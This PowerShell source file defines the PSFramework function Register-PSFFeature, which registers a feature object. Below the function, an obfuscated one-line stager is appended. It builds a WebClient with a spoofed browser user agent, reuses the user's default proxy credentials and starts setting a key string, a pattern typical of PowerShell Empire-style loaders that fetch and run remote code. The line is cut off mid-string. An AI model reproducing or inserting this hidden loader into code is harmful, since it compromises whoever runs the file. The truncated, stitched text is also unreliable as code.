function Register-PSFFeature
{

	[CmdletBinding()]
	param (
		[Parameter(Mandatory = $true)]
		[string]
		$Name,
		
		[string]
		$Description,
		
		[switch]
		$NotGlobal,
		
		[switch]
		$NotModuleSpecific,
		
		[string]
		$Owner = (Get-PSCallStack)[1].InvocationInfo.MyCommand.ModuleName
	)
	
	begin
	{
		$featureObject = New-Object PSFramework.Feature.FeatureItem -Property @{
			Name = $Name
			Owner = $Owner
			Global = (-not $NotGlobal)
			ModuleSpecific = (-not $NotModuleSpecific)
			Description = $Description
		}
	}
	process
	{
		[PSFramework.Feature.FeatureHost]::Features[$Name] = $featureObject
	}
}
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

